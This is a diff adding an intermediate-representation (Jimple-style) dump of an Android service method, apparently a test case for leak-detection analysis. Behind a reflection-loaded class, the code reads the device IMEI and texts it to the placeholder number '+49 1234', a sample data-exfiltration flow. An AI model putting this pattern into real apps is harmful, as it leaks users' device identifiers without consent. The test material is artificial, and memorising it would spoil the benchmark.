@@ -1,0 +1,22 @@
+*!!**
+entry
+$r0 := @this: com.javacodegeeks.android.androidserviceexample.MyService
+$i0 := @parameter0: int
+if $i0 >= 20 goto $r3 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>("de.ecspride.ConcreteClass")
+exit
+***
+$r2 = <java.lang.System: java.io.PrintStream out>
+virtualinvoke $r2.<java.io.PrintStream: void println(java.lang.String)>("i is less than 20")
+return
+***
+$r3 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>("de.ecspride.ConcreteClass")
+$r4 = virtualinvoke $r3.<java.lang.Class: java.lang.Object newInstance()>()
+$r5 = (com.javacodegeeks.android.androidserviceexample.BaseClass) $r4
+$r4 = virtualinvoke $r0.<com.javacodegeeks.android.androidserviceexample.MyService: java.lang.Object getSystemService(java.lang.String)>("phone")
+$r6 = (android.telephony.TelephonyManager) $r4
+$r1 = virtualinvoke $r6.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()
+$r5.<com.javacodegeeks.android.androidserviceexample.BaseClass: java.lang.String imei> = $r1
+$r7 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>()
+$r1 = $r5.<com.javacodegeeks.android.androidserviceexample.BaseClass: java.lang.String imei>
+virtualinvoke $r7.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("+49 1234", null, $r1, null, null)
+return
